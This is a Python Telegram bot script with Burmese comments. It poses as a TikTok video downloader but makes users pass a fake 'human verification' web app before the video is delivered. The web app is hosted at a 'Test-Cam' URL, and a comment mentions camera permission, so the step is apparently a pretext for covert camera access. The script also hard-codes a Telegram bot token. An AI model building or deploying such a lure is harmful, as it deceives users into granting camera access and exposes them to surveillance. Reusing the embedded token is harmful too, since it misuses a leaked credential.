import telebot
import requests
from telebot import types

BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
WEB_APP_URL = "https://tar-alt.github.io/Test-Cam/" 

bot = telebot.TeleBot(BOT_TOKEN)

# User တစ်ယောက်ချင်းစီရဲ့ Link ကို သိမ်းထားဖို့ (Temporary Storage)
user_data = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_tiktok(message):
    user_id = message.chat.id
    user_link = message.text
    
    # User ပို့လိုက်တဲ့ link ကို ခဏသိမ်းထားမယ်
    user_data[user_id] = user_link
    
    markup = types.InlineKeyboardMarkup()
    # WebApp အစား URL Button နဲ့သွားရင် ပိုစိတ်ချရပါတယ် (Camera Permission အတွက်)
    # ဒါပေမဲ့ WebApp သုံးချင်ရင်လည်း ရပါတယ်
    web_app = types.WebAppInfo(url=WEB_APP_URL)
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔒", web_app=web_app)
    markup.add(verify_btn)
    
    bot.send_message(user_id, f"⚠️ *Verification Required*\n\nလူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးပါ။\n\nLink: `{user_link}`", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: "Verification_Success" in message.text)
def process_download(message):
    user_id = message.chat.id
    
    # အရင်သိမ်းထားတဲ့ Link ရှိမရှိ စစ်မယ်
    target_link = user_data.get(user_id)
    
    if not target_link:
        bot.send_message(user_id, "❌ Error: Link ကို ပြန်မရှာနိုင်ပါ။ ကျေးဇူးပြု၍ Link ပြန်ပို့ပေးပါ။")
        return

    status_msg = bot.send_message(user_id, "🚀 Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
    
    try:
        # TikTok API သုံးပြီး ဗီဒီယိုယူခြင်း
        api_url = f"https://www.tikwm.com/api/?url={target_link}&hd=1"
        res = requests.get(api_url).json()
        
        if res.get('code') == 0:
            video_url = res['data'].get('hdplay') or res['data'].get('play')
            bot.send_video(user_id, video_url, caption="✅ *Download Successful!*")
            bot.delete_message(user_id, status_msg.message_id)
            # ပို့ပြီးရင် data ကို ဖျက်လိုက်မယ်
            del user_data[user_id]
        else:
            bot.edit_message_text("❌ ဗီဒီယို ဒေါင်းလုဒ်ဆွဲ၍ မရပါ။ Link မှားနေနိုင်ပါသည်။", user_id, status_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"⚠️ စနစ်ချို့ယွင်းချက် ရှိနေပါသည်။", user_id, status_msg.message_id)

bot.infinity_polling()

